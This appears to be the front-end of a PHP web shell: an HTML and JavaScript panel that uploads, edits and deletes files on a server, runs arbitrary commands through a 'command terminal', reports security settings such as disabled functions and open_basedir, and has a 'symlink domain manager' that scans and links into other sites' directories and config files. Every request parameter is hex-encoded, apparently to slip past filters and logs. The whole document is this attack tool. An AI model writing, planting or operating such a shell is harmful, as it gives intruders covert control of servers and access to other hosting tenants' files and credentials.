        <div class="controls">
            <div class="control-panel">
                <h3>  UPLOAD FILE</h3>
                <div class="form-group">
                    <label for="fileUpload">SELECT FILE:</label>
                    <input type="file" id="fileUpload" multiple class="form-control file-input">
                </div>
                <div class="upload-info">
                    <div class="upload-stats">
                        <span id="fileCount">No files selected</span>
                        <span id="totalSize"></span>
                    </div>
                </div>
                <button class="btn" onclick="uploadFiles()">📤 UPLOAD</button>
                <div id="uploadProgress" class="upload-progress" style="display: none;">
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                    <div class="progress-text">Uploading...</div>
                </div>
            </div>
            
            <div class="control-panel">
                <h3> 📄 CREATE FILE</h3>
                <div class="form-group">
                    <label for="filename">FILE NAME:</label>
                    <input type="text" id="filename" placeholder="Enter file name">
                </div>
                <div class="form-group">
                    <label for="filecontent">CONTENT:</label>
                    <textarea id="filecontent" placeholder="File content (optional)" rows="4"></textarea>
                </div>
                <button class="btn" onclick="createFile()">CREATE FILE</button>
            </div>
            
            <div class="control-panel">
                <h3>📁 CREATE FOLDER</h3>
                <div class="form-group">
                    <label for="foldername">FOLDER NAME:</label>
                    <input type="text" id="foldername" placeholder="Enter folder name">
                </div>
                <button class="btn" onclick="createFolder()">CREATE FOLDER</button>
            </div>
            
            <div class="control-panel">
                <h3>⚡ COMMAND TERMINAL</h3>
                <div class="form-group">
                    <label for="command">COMMAND:</label>
                    <input type="text" id="command" placeholder="Enter command">
                </div>
                <button class="btn" onclick="runCommand()">EXECUTE</button>
                <div id="output" class="output" style="display: none;"></div>
            </div>
            
            <div class="control-panel">
                <h3>🔗 SYMLINK DOMAIN MANAGER</h3>
                <div class="symlink-controls">
                    <button class="btn" onclick="scanDomains()">🔍 SCAN ALL</button>
                    <button class="btn" onclick="showAutoSearch()">🔎 AUTO SEARCH</button>
                    <button class="btn" onclick="showSymlinkCreator()">➕ CREATE SYMLINK</button>
                </div>
                <div id="domainResults" class="domain-results" style="display: none;"></div>
                <div id="searchProgress" class="search-progress" style="display: none;">
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                    <div class="progress-text">Scanning domains...</div>
                </div>
            </div>
        </div>
        
        <div class="file-list">
            <?php foreach ($files as $file): ?>
                <?php if ($file == '.' || $file == '..') continue; ?>
                <?php $fullPath = $dir . '/' . $file; ?>
                
                <div class="file-item">
                    <div class="file-info">
                        <?php if (is_dir($fullPath)): ?>
                            <span class="file-icon">📁</span>
                            <button class="nav-button file-name" onclick="navigateToDir('<?php echo bin2hex($fullPath); ?>')">
                                <?php echo htmlspecialchars($file); ?>
                            </button>
                        <?php else: ?>
                            <span class="file-icon">📄</span>
                            <span class="file-name"><?php echo htmlspecialchars($file); ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="file-actions">
                        <?php if (!is_dir($fullPath)): ?>
                            <button class="btn btn-small" onclick="viewFile('<?php echo bin2hex($file); ?>')">VIEW</button>
                            <button class="btn btn-small" onclick="editFile('<?php echo bin2hex($file); ?>')">EDIT</button>
                        <?php endif; ?>
                        <button class="btn btn-small btn-danger" onclick="deleteItem('<?php echo bin2hex($file); ?>')">DELETE</button>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    </div>

    <!-- File Editor Modal -->
    <div id="editorModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modalTitle">📝 EDITING FILE</h3>
                <button class="close-btn" onclick="closeEditor()">&times;</button>
            </div>
            <div>
                <textarea id="codeEditor" class="code-editor" placeholder="File content will appear here..."></textarea>
                <div class="editor-controls">
                    <button class="btn" onclick="saveFile()">💾 SAVE</button>
                    <button class="btn btn-danger" onclick="closeEditor()">❌ CANCEL</button>
                </div>
            </div>
        </div>
    </div>

    <!-- File Viewer Modal -->
    <div id="viewerModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="viewerTitle">👁️ VIEWING FILE</h3>
                <button class="close-btn" onclick="closeViewer()">&times;</button>
            </div>
            <div>
                <pre id="fileViewer" class="code-editor" style="overflow: auto;"></pre>
                <div class="editor-controls">
                    <button class="btn" onclick="closeViewer()">✅ CLOSE</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Server Info Modal -->
    <div id="serverInfoModal" class="modal">
        <div class="modal-content" style="max-width: 900px;">
            <div class="modal-header">
                <h3>🖥️ SERVER INFORMATION</h3>
                <button class="close-btn" onclick="closeServerInfo()">&times;</button>
            </div>
            <div>
                <div id="serverInfoContent" class="server-info-content"></div>
                <div class="editor-controls">
                    <button class="btn" onclick="closeServerInfo()">✅ CLOSE</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Symlink Creator Modal -->
    <div id="symlinkModal" class="modal">
        <div class="modal-content" style="max-width: 600px;">
            <div class="modal-header">
                <h3>🔗 CREATE SYMLINK</h3>
                <button class="close-btn" onclick="closeSymlinkModal()">&times;</button>
            </div>
            <div>
                <div class="form-group">
                    <label for="targetPath">TARGET PATH:</label>
                    <input type="text" id="targetPath" placeholder="e.g., /home/username/public_html" class="form-control">
                </div>
                <div class="form-group">
                    <label for="linkName">SYMLINK NAME:</label>
                    <input type="text" id="linkName" placeholder="e.g., target_domain" class="form-control">
                </div>
                <div class="editor-controls">
                    <button class="btn" onclick="createSymlink()">🔗 CREATE</button>
                    <button class="btn" onclick="closeSymlinkModal()">❌ CANCEL</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Auto Search Modal -->
    <div id="autoSearchModal" class="modal">
        <div class="modal-content" style="max-width: 700px;">
            <div class="modal-header">
                <h3>🔎 AUTO SEARCH DOMAINS</h3>
                <button class="close-btn" onclick="closeAutoSearchModal()">&times;</button>
            </div>
            <div>
                <div class="form-group">
                    <label for="searchTerm">SEARCH TERM:</label>
                    <input type="text" id="searchTerm" placeholder="e.g., domain name, website, etc." class="form-control">
                </div>
                <div class="form-group">
                    <label for="searchType">SEARCH TYPE:</label>
                    <select id="searchType" class="form-control">
                        <option value="name">Directory Name</option>
                        <option value="content">File Content</option>
                        <option value="config">Config Files</option>
                    </select>
                </div>
                <div class="editor-controls">
                    <button class="btn" onclick="runAutoSearch()">🔍 SEARCH</button>
                    <button class="btn" onclick="closeAutoSearchModal()">❌ CANCEL</button>
                </div>
                <div id="autoSearchResults" class="domain-results" style="display: none;"></div>
            </div>
        </div>
    </div>

    <script>
        let currentEditingFile = null;
        
        function strToHex(str) {
            return str.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        }

        function hexToStr(hex) {
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return str;
        }

        function navigateToDir(hexPath) {
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('navigate'));
            formData.append(strToHex('path'), hexPath);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(() => location.reload());
        }

        function createFile() {
            const filename = document.getElementById('filename').value;
            const content = document.getElementById('filecontent').value;
            if (!filename) return alert('Please enter a filename');
            
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('create_file'));
            formData.append(strToHex('filename'), strToHex(filename));
            formData.append(strToHex('content'), strToHex(content));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(() => {
                    document.getElementById('filename').value = '';
                    document.getElementById('filecontent').value = '';
                    location.reload();
                });
        }

        function uploadFiles() {
            const fileInput = document.getElementById('fileUpload');
            const files = fileInput.files;
            
            if (files.length === 0) {
                alert('Please select at least one file');
                return;
            }
            
            showUploadProgress('Preparing upload...');
            uploadFileSequentially(files, 0);
        }

        function uploadFileSequentially(files, index) {
            if (index >= files.length) {
                hideUploadProgress();
                alert('All files uploaded successfully!');
                location.reload();
                return;
            }
            
            const file = files[index];
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('upload_file'));
            formData.append('file', file);
            
            updateUploadProgress(`Uploading ${file.name} (${index + 1}/${files.length})...`, (index / files.length) * 100);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const message = hexToStr(data.message);
                        console.log('Upload success:', message);
                        uploadFileSequentially(files, index + 1);
                    } else {
                        const error = hexToStr(data.error);
                        alert(`Error uploading ${file.name}: ${error}`);
                        hideUploadProgress();
                    }
                })
                .catch(error => {
                    alert(`Upload error for ${file.name}: ${error.message}`);
                    hideUploadProgress();
                });
        }

        function showUploadProgress(message) {
            document.getElementById('uploadProgress').style.display = 'block';
            updateUploadProgress(message, 0);
        }

        function updateUploadProgress(message, percentage) {
            document.querySelector('#uploadProgress .progress-text').textContent = message;
            document.querySelector('#uploadProgress .progress-fill').style.width = percentage + '%';
        }

        function hideUploadProgress() {
            document.querySelector('#uploadProgress .progress-fill').style.width = '100%';
            setTimeout(() => {
                document.getElementById('uploadProgress').style.display = 'none';
                document.querySelector('#uploadProgress .progress-fill').style.width = '0%';
            }, 1000);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const fileInput = document.getElementById('fileUpload');
            if (fileInput) {
                fileInput.addEventListener('change', function() {
                    const files = this.files;
                    const fileCount = files.length;
                    let totalSize = 0;
                    for (let i = 0; i < fileCount; i++) totalSize += files[i].size;
                    document.getElementById('fileCount').textContent = (fileCount === 1 ? '1 file selected' : `${fileCount} files selected`);
                    document.getElementById('totalSize').textContent = formatFileSize(totalSize);
                });
            }
        });

        function formatFileSize(bytes) {
            const units = ['B', 'KB', 'MB', 'GB'];
            let size = bytes, unitIndex = 0;
            while (size >= 1024 && unitIndex < units.length - 1) { size /= 1024; unitIndex++; }
            return size.toFixed(2) + ' ' + units[unitIndex];
        }

        function createFolder() {
            const foldername = document.getElementById('foldername').value;
            if (!foldername) return alert('Please enter a folder name');
            
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('create_folder'));
            formData.append(strToHex('foldername'), strToHex(foldername));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(() => {
                    document.getElementById('foldername').value = '';
                    location.reload();
                });
        }

        function deleteItem(hexItem) {
            if (!confirm('Are you sure you want to delete this item?')) return;
            
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('delete'));
            formData.append(strToHex('item'), hexItem);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(() => location.reload());
        }

        // (Definisi navigateToDir kedua tetap)
        function navigateToDir(hexDir) {
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('navigate'));
            formData.append(strToHex('path'), hexDir);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        location.reload();
                    } else {
                        alert('Error navigating to directory: ' + (data.error || 'Unknown error'));
                    }
                })
                .catch(error => {
                    console.error('Navigation error:', error);
                    alert('Navigation failed');
                });
        }

        function navigateToManualPath() {
            const path = document.getElementById('manualPath').value.trim();
            if (!path) { alert('Please enter a path'); return; }
            const hexPath = strToHex(path);
            navigateToDir(hexPath);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const manualPathInput = document.getElementById('manualPath');
            if (manualPathInput) {
                manualPathInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') navigateToManualPath();
                });
            }
        });

        function runCommand() {
            const command = document.getElementById('command').value;
            if (!command) return alert('Please enter a command');
            
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('run_command'));
            formData.append(strToHex('command'), strToHex(command));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const outputDiv = document.getElementById('output');
                        outputDiv.style.display = 'block';
                        outputDiv.textContent = data.output || 'Command executed successfully';
                    }
                });
        }

        function viewFile(hexFilename) {
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('read_file'));
            formData.append(strToHex('filename'), hexFilename);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const content = hexToStr(data.content);
                        const filename = hexToStr(hexFilename);
                        document.getElementById('viewerTitle').textContent = '👁️ VIEWING: ' + filename;
                        document.getElementById('fileViewer').textContent = content;
                        document.getElementById('viewerModal').style.display = 'block';
                    } else {
                        alert('Error reading file: ' + data.error);
                    }
                });
        }

        function editFile(hexFilename) {
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('read_file'));
            formData.append(strToHex('filename'), hexFilename);
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const content = hexToStr(data.content);
                        const filename = hexToStr(hexFilename);
                        currentEditingFile = hexFilename;
                        document.getElementById('modalTitle').textContent = '📝 EDITING: ' + filename;
                        document.getElementById('codeEditor').value = content;
                        document.getElementById('editorModal').style.display = 'block';
                    } else {
                        alert('Error reading file: ' + data.error);
                    }
                });
        }

        function saveFile() {
            if (!currentEditingFile) return;
            const content = document.getElementById('codeEditor').value;
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('save_file'));
            formData.append(strToHex('filename'), currentEditingFile);
            formData.append(strToHex('content'), strToHex(content));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('File saved successfully!');
                        closeEditor();
                        location.reload();
                    } else {
                        alert('Error saving file');
                    }
                });
        }

        function closeEditor() {
            document.getElementById('editorModal').style.display = 'none';
            currentEditingFile = null;
        }

        function closeViewer() {
            document.getElementById('viewerModal').style.display = 'none';
        }

        function showServerInfo() {
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('server_info'));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        displayServerInfo(data.data);
                        document.getElementById('serverInfoModal').style.display = 'block';
                    } else {
                        alert('Error fetching server information');
                    }
                });
        }

        function displayServerInfo(encodedData) {
            let html = '';
            html += '<div class="server-info-section"><h4>🔧 PHP CONFIGURATION</h4>';
            html += `<div class="server-info-item"><div class="server-info-key">PHP Version:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('php_version')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">PHP SAPI:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('php_sapi')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Memory Limit:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('memory_limit')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Max Execution Time:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('max_execution_time')])} seconds</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Upload Max Filesize:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('upload_max_filesize')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Post Max Size:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('post_max_size')])}</div></div>`;
            html += '</div>';
            html += '<div class="server-info-section"><h4>🌐 SERVER INFORMATION</h4>';
            html += `<div class="server-info-item"><div class="server-info-key">Server Software:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('server_software')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Server Name:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('server_name')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Server Address:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('server_addr')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Server Port:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('server_port')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Document Root:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('document_root')])}</div></div>`;
            html += '</div>';
            html += '<div class="server-info-section"><h4>💻 SYSTEM INFORMATION</h4>';
            html += `<div class="server-info-item"><div class="server-info-key">Current User:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('current_user')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">System:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('system')])}</div></div>`;
            html += '</div>';
            html += '<div class="server-info-section"><h4>🔒 SECURITY SETTINGS</h4>';
            html += `<div class="server-info-item"><div class="server-info-key">Safe Mode:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('safe_mode')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Magic Quotes GPC:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('magic_quotes_gpc')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Register Globals:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('register_globals')])}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Open Basedir:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('open_basedir')]) || 'Not Set'}</div></div>`;
            html += `<div class="server-info-item"><div class="server-info-key">Disabled Functions:</div><div class="server-info-value">${hexToStr(encodedData[strToHex('disabled_functions')]) || 'None'}</div></div>`;
            html += '</div>';
            if (encodedData[strToHex('loaded_extensions')]) {
                html += '<div class="server-info-section"><h4>📦 LOADED PHP EXTENSIONS</h4>';
                const extensions = encodedData[strToHex('loaded_extensions')];
                for (let i = 0; i < Math.min(extensions.length, 50); i++) {
                    html += `<div class="server-info-item"><div class="server-info-key">Extension ${i+1}:</div><div class="server-info-value">${hexToStr(extensions[i])}</div></div>`;
                }
                if (extensions.length > 50) {
                    html += `<div class="server-info-item"><div class="server-info-key">...</div><div class="server-info-value">and ${extensions.length - 50} more extensions</div></div>`;
                }
                html += '</div>';
            }
            document.getElementById('serverInfoContent').innerHTML = html;
        }

        function closeServerInfo() { document.getElementById('serverInfoModal').style.display = 'none'; }

        function scanDomains() {
            showProgress('Scanning all domains...');
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('symlink_domain'));
            formData.append(strToHex('symlink_action'), strToHex('scan'));
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    hideProgress();
                    if (data.success) {
                        displayDomains(data.domains, data.total || 0);
                        document.getElementById('domainResults').style.display = 'block';
                    } else { alert('Error scanning domains'); }
                })
                .catch(error => { hideProgress(); alert('Error: ' + error.message); });
        }

        function showAutoSearch() { document.getElementById('autoSearchModal').style.display = 'block'; }

        function runAutoSearch() {
            const searchTerm = document.getElementById('searchTerm').value;
            const searchType = document.getElementById('searchType').value;
            if (!searchTerm.trim()) { alert('Please enter a search term'); return; }
            showProgress(`Searching for "${searchTerm}" in ${searchType}...`);
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('symlink_domain'));
            formData.append(strToHex('symlink_action'), strToHex('auto_search'));
            formData.append(strToHex('search_term'), strToHex(searchTerm));
            formData.append(strToHex('search_type'), strToHex(searchType));
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    hideProgress();
                    if (data.success) {
                        displayAutoSearchResults(data.results, data.total || 0);
                        document.getElementById('autoSearchResults').style.display = 'block';
                    } else { alert('No results found'); }
                })
                .catch(error => { hideProgress(); alert('Search error: ' + error.message); });
        }

        function showProgress(message) {
            document.getElementById('searchProgress').style.display = 'block';
            document.querySelector('.progress-text').textContent = message;
            let progress = 0;
            const progressFill = document.querySelector('.progress-fill');
            const interval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress >= 90) { progress = 90; clearInterval(interval); }
                progressFill.style.width = progress + '%';
            }, 200);
            window.progressInterval = interval;
        }

        function hideProgress() {
            if (window.progressInterval) clearInterval(window.progressInterval);
            document.querySelector('.progress-fill').style.width = '100%';
            setTimeout(() => {
                document.getElementById('searchProgress').style.display = 'none';
                document.querySelector('.progress-fill').style.width = '0%';
            }, 500);
        }

        function displayDomains(domains, total) {
            let html = `<div class="search-stats">
                <div class="stat-item">📊 Total Found: ${total}</div>
                <div class="stat-item">🌐 Web Directories: ${domains.filter(d => hexToStr(d[strToHex('web_dir')]) === 'Yes').length}</div>
                <div class="stat-item">✅ Readable: ${domains.filter(d => hexToStr(d[strToHex('size')]) === 'Readable').length}</div>
            </div>`;
            
            if (domains.length === 0) {
                html += '<div class="domain-item">No domains found</div>';
            } else {
                const webDirs = domains.filter(d => { try { return hexToStr(d[strToHex('web_dir')]) === 'Yes'; } catch(e){ return false; }});
                const regularDirs = domains.filter(d => { try { return hexToStr(d[strToHex('web_dir')]) === 'No'; } catch(e){ return true; }});
                
                if (webDirs.length > 0) {
                    html += '<div class="domain-category">';
                    html += '<div class="category-header" onclick="toggleCategory(this)">🌐 WEB DIRECTORIES (' + webDirs.length + ') ⬇️</div>';
                    html += '<div class="category-content">';
                    webDirs.forEach(domain => { html += createDomainItem(domain, true); });
                    html += '</div></div>';
                }
                
                if (regularDirs.length > 0) {
                    html += '<div class="domain-category">';
                    html += '<div class="category-header" onclick="toggleCategory(this)">📁 OTHER DIRECTORIES (' + regularDirs.length + ') ⬇️</div>';
                    html += '<div class="category-content" style="display: none;">';
                    regularDirs.forEach(domain => { html += createDomainItem(domain, false); });
                    html += '</div></div>';
                }
            }
            document.getElementById('domainResults').innerHTML = html;
        }

        function createDomainItem(domain, isWebDir) {
            try {
                const name = hexToStr(domain[strToHex('name')]);
                const path = hexToStr(domain[strToHex('path')]);
                const size = hexToStr(domain[strToHex('size')]);
                const type = hexToStr(domain[strToHex('type')]);
                const files = domain[strToHex('files')] ? hexToStr(domain[strToHex('files')]) : '0';
                const basePath = domain[strToHex('base_path')] ? hexToStr(domain[strToHex('base_path')]) : '';
                const webIndicator = isWebDir ? '<span class="web-indicator">WEB</span>' : '';
                return `
                    <div class="domain-item" onclick="selectDomain('${path}', '${name}')">
                        <div class="domain-name">📁 ${name} ${webIndicator}</div>
                        <div class="domain-path">📍 ${path}</div>
                        <div class="domain-info">📊 ${size} | 🔗 ${type} | 📄 ${files} files | 📂 ${basePath}</div>
                    </div>
                `;
            } catch (e) {
                return '<div class="domain-item">Error displaying domain</div>';
            }
        }

        function displayAutoSearchResults(results, total) {
            let html = `<h4>🔍 SEARCH RESULTS (${total} found):</h4>`;
            if (results.length === 0) {
                html += '<div class="domain-item">No results found</div>';
            } else {
                results.forEach(result => {
                    const name = hexToStr(result[strToHex('name')]);
                    const path = hexToStr(result[strToHex('path')]);
                    const type = hexToStr(result[strToHex('type')]);
                    const searchType = hexToStr(result[strToHex('search_type')] || strToHex('name'));
                    html += `
                        <div class="domain-item" onclick="selectDomain('${path}', '${name}')">
                            <div class="domain-name">  ${name} <span class="web-indicator">${searchType.toUpperCase()}</span></div>
                            <div class="domain-path">📍 ${path}</div>
                            <div class="domain-info">🔗 ${type}</div>
                        </div>
                    `;
                });
            }
            document.getElementById('autoSearchResults').innerHTML = html;
        }

        function toggleCategory(header) {

            const content = header.nextElementSibling;
            const isVisible = content.style.display !== 'none';
            
            content.style.display = isVisible ? 'none' : 'block';
            header.textContent = header.textContent.replace(isVisible ? '⬇️' : '⬆️', isVisible ? '⬆️' : '⬇️');
        }

        function closeAutoSearchModal() {
            document.getElementById('autoSearchModal').style.display = 'none';
            document.getElementById('searchTerm').value = '';
            document.getElementById('autoSearchResults').style.display = 'none';
        }

        function selectDomain(path, name) {
            document.getElementById('targetPath').value = path;
            document.getElementById('linkName').value = name + '_symlink';
            showSymlinkCreator();
        }

        function showSymlinkCreator() {
            document.getElementById('symlinkModal').style.display = 'block';
        }

        function createSymlink() {
            const targetPath = document.getElementById('targetPath').value;
            const linkName = document.getElementById('linkName').value;
            
            if (!targetPath || !linkName) {
                alert('Please fill in both target path and symlink name');
                return;
            }
            
            const formData = new FormData();
            formData.append(strToHex('action'), strToHex('symlink_domain'));
            formData.append(strToHex('symlink_action'), strToHex('create'));
            formData.append(strToHex('target_path'), strToHex(targetPath));
            formData.append(strToHex('link_name'), strToHex(linkName));
            
            fetch('', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const method = hexToStr(data.method);
                        const message = hexToStr(data.message);
                        alert('Success: ' + message);
                        closeSymlinkModal();
                        location.reload();
                    } else {
                        const message = hexToStr(data.message);
                        alert('Error: ' + message);
                    }
                });
        }

        function closeSymlinkModal() {
            document.getElementById('symlinkModal').style.display = 'none';
            document.getElementById('targetPath').value = '';
            document.getElementById('linkName').value = '';
        }

        // Close modals when clicking outside
        window.onclick = function(event) {
            const editorModal = document.getElementById('editorModal');
            const viewerModal = document.getElementById('viewerModal');
            const serverInfoModal = document.getElementById('serverInfoModal');
            const symlinkModal = document.getElementById('symlinkModal');
            const autoSearchModal = document.getElementById('autoSearchModal');
            
            if (event.target === editorModal) {
                closeEditor();
            }
            if (event.target === viewerModal) {
                closeViewer();
            }
            if (event.target === serverInfoModal) {
                closeServerInfo();
            }
            if (event.target === symlinkModal) {
                closeSymlinkModal();
            }
            if (event.target === autoSearchModal) {
                closeAutoSearchModal();
            }
        }

        // Auto-clear command input after execution
        document.getElementById('command').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                runCommand();
                this.value = '';
            }
        });

        // Keyboard shortcuts for editor
        document.addEventListener('keydown', function(e) {
            // Ctrl+S to save in editor
            if (e.ctrlKey && e.key === 's' && currentEditingFile) {
                e.preventDefault();
                saveFile();
            }
            
            // Escape to close modals
            if (e.key === 'Escape') {
                closeEditor();
                closeViewer();
                closeServerInfo();
                closeSymlinkModal();
                closeAutoSearchModal();
            }
        });
    </script>
</body>
</html>
